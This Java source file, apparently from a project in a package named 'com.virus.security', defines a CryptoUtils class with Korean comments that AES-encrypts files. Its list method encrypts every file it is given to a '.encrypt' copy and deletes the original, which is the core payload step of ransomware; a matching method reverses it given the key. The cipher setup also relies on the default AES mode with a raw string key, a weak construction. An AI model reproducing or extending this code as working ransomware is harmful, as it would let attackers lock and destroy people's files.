package com.virus.security;


import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
/**
 * Created by codertimo on 15. 11. 25..
 */
public class CryptoUtils {

    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES";

    /**
     * 파일 암호화 메소드
     * @param key
     * @param inputFile
     * @param outputFile
     * @throws CryptoException
     */
    public static void encrypt(String key, File inputFile, File outputFile)
            throws CryptoException {
        doCrypto(Cipher.ENCRYPT_MODE, key, inputFile, outputFile);
    }

    /**
     * 파일 복호화 메소드
     * @param key
     * @param inputFile
     * @param outputFile
     * @throws CryptoException
     */
    public static void decrypt(String key, File inputFile, File outputFile)
            throws CryptoException {
        doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);
    }


    /**
     * 암호화 알고리즘
     * @param cipherMode
     * @param key
     * @param inputFile
     * @param outputFile
     * @throws CryptoException
     */
    private static void doCrypto(int cipherMode, String key, File inputFile,
                                 File outputFile) throws CryptoException {
        try {
            Key secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(cipherMode, secretKey);

            FileInputStream inputStream = new FileInputStream(inputFile);
            byte[] inputBytes = new byte[(int) inputFile.length()];
            inputStream.read(inputBytes);

            byte[] outputBytes = cipher.doFinal(inputBytes);

            FileOutputStream outputStream = new FileOutputStream(outputFile);
            outputStream.write(outputBytes);

            inputStream.close();
            outputStream.close();

        } catch (NoSuchPaddingException | NoSuchAlgorithmException
                | InvalidKeyException | BadPaddingException
                | IllegalBlockSizeException | IOException ex) {
            throw new CryptoException("Error encrypting/decrypting file", ex);
        }
    }

    /**
     * 리스트 암호화 메소드
     * @param files
     * @param key
     */
    public static void encrypt(ArrayList<File> files, String key)
    {
        for(File file : files)
        {
            try {
                File output = new File(file.getPath() + ".encrypt");
                CryptoUtils.encrypt(key, file, output);
                file.delete();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }


    /**
     * 리스트 복호화 메소드
     * @param files
     * @param key
     */
    public static void decrypt(ArrayList<File> files, String key)
    {
        for(File file : files)
        {
            try {
                String file_name = file.getPath().split(".encrypt")[0];
                System.out.println(file_name);
                File output = new File(file_name);
                CryptoUtils.decrypt(key, file, output);
                file.delete();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }

}
